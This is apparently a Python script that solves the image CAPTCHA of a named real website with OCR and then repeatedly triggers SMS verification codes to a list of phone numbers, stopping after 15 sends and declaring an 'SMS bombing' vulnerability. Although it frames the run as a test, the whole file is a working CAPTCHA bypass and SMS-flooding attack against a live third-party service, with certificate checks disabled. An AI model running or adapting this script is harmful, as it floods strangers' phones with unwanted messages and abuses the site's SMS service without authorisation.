import json
import time

import cchardet as cchardet
import ddddocr
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def do():
    ip_list = []
    with open('../fuzz/ip.txt', 'r') as file:
        for line in file:
            # 去除行尾的换行符并添加到列表中
            ip_list.append(line.rstrip('\n'))
    phone_list = []
    with open('../fuzz/phone.txt', 'r') as file:
        for line in file:
            # 去除行尾的换行符并添加到列表中
            phone_list.append(line.rstrip('\n'))
    success_num = 0
    index = 0
    ocr = ddddocr.DdddOcr(show_ad=False)
    for ip in ip_list:
        url1 = "https://up.daojia.com/vip/getGraphConfirmCode?_action_time=1689046994960"
        r1 = requests.get(url=url1, timeout=5, verify=False)
        data1 = json.loads(r1.text)
        graph_confirmCode_img = data1['data']['graph_confirmCode_img']
        graph_confirmCode_id = data1['data']['graph_confirmCode_id']
        image_code = ocr.classification(graph_confirmCode_img)

        send_url = "https://up.daojia.com/vip/getSmsConfirmCode?mobile=" + phone_list[index] + "&graph_confirmCode=" + image_code\
                   + "&graph_confirmCode_id=" + graph_confirmCode_id + "&_action_time=1689047017494"
        r5 = requests.get(url=send_url, timeout=5, verify=False)

        if 'true' in r5.text:
            success_num = success_num + 1
            index = index + 1
            print('发送成功：累计发送：' + str(success_num))
        else:
            print('发送失败：' + r5.text)
        if success_num >= 15:
            print("测试成功发送15条信息，存在短信轰炸漏洞！")
            break
        time.sleep(1)


if __name__ == "__main__":
    do()
